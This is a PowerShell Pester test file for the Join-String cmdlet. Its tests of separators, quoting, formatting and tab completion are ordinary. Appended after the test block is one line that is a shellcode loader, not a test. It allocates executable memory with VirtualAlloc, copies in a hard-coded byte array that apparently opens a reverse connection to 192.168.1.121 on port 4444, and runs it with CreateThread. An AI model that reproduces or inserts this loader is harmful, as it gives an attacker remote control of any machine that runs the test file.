


Describe "Join-String" -Tags "CI" {

    BeforeAll {
        $testObject = Get-ChildItem
    }

    It "Should be called using the InputObject without error with no other switches" {
        { Join-String -InputObject $testObject } | Should -Not -Throw
    }

    It "'Input | Join-String' should be equal to 'Join-String -InputObject Input'" {
        $result1 = $testObject | Join-String
        $result2 = Join-String -InputObject $testObject
        $result1 | Should -BeExactly $result2
    }

    It "Should return a single string" {
        $actual = $testObject | Join-String

        $actual.Count | Should -Be 1
        $actual | Should -BeOfType System.String
    }

    It "Should join property values with default separator" {
        $expected = $testObject.Name -join $ofs
        $actual = $testObject | Join-String -Property Name
        $actual | Should -BeExactly $expected
    }

    It "Should join property values positionally with default separator" {
        $expected = $testObject.Name -join $ofs
        $actual = $testObject | Join-String Name
        $actual | Should -BeExactly $expected
    }

    It "Should join property values with custom Separator" {
        $expected = $testObject.Name -join "; "
        $actual = $testObject | Join-String -Property Name -Separator "; "
        $actual | Should -BeExactly $expected
    }

    It "Should join property values SingleQuoted" {
        $expected = ($testObject.Name).ForEach{"'$_'"} -join "; "
        $actual = $testObject | Join-String -Property Name -Separator "; " -SingleQuote
        $actual | Should -BeExactly $expected
    }

    It "Should join property values DoubleQuoted" {
        $expected = ($testObject.Name).ForEach{"""$_"""} -join "; "
        $actual = $testObject | Join-String -Property Name -Separator "; " -DoubleQuote
        $actual | Should -BeExactly $expected
    }

    It "Should join property values Formatted" {
        $expected = ($testObject.Name).ForEach{"[$_]"} -join "; "
        $actual = $testObject | Join-String -Property Name -Separator "; " -Format "[{0}]"
        $actual | Should -BeExactly $expected
    }

    It "Should join numeric values Formatted" {
        $testValues = 1.2, 3.4, 5.6
        $expected = $testValues.Foreach{"{0:N2}" -f $_} -join "; "
        $actual = $testValues | Join-String -Separator "; " -Format "{0:N2}"
        $actual | Should -BeExactly $expected
    }

    It "Should join script block results with default separator" {
        $sb = {$_.Name + $_.Length}
        $expected = ($testObject | ForEach-Object $sb) -join $ofs
        $actual = $testObject | Join-String -Property $sb
        $actual | Should -BeExactly $expected
    }

    It "Should join script block results with custom separator" {
        $sb = {$_.Name + $_.Length}
        $expected = ($testObject | ForEach-Object $sb) -join "; "
        $actual = $testObject | Join-String -Property $sb -Separator "; "
        $actual | Should -BeExactly $expected
    }

    It "Should join script block results SingleQuoted" {
        $sb = {$_.Name + $_.Length}
        $expected = ($testObject | ForEach-Object $sb).ForEach{"'$_'"} -join $ofs
        $actual = $testObject | Join-String -Property $sb -SingleQuote
        $actual | Should -BeExactly $expected
    }
    It "Should join script block results DoubleQuoted" {
        $sb = {$_.Name + $_.Length}
        $expected = ($testObject | ForEach-Object $sb).ForEach{"""$_"""} -join $ofs
        $actual = $testObject | Join-String -Property $sb -DoubleQuote
        $actual | Should -BeExactly $expected
    }

    It "Should join script block results with Format and separator" {
        $sb = {$_.Name + $_.Length}
        $expected = ($testObject | ForEach-Object $sb).ForEach{"[{0}]" -f $_} -join "; "
        $actual = $testObject | Join-String -Property $sb -Separator "; " -Format "[{0}]"
        $actual | Should -BeExactly $expected
    }

    It "Should Handle OutputPrefix and OutputSuffix" {
        $ofs = ','
        $expected = "A 1,2,3 B"
        $actual = 1..3 | Join-String -OutputPrefix "A " -OutputSuffix " B"
        $actual | Should -BeExactly $expected
    }

    It "Should handle null separator" {
        $expected = -join 'hello'.tochararray()
        $actual = "hello" | Join-String -separator $null
        $actual | Should -BeExactly $expected
    }

    It "Should tabcomplete InputObject properties" {
        $cmd = '[io.fileinfo]::new("c:\temp") | Join-String -Property '
        $res = tabexpansion2 $cmd $cmd.length
        $completionTexts = $res.CompletionMatches.CompletionText
        $Properties = [io.fileinfo]::new($PSScriptRoot).psobject.properties.Name
        foreach ($n in $Properties) {
            $n -in $completionTexts | Should -BeTrue
        }
    }

}

$code = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x79,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };

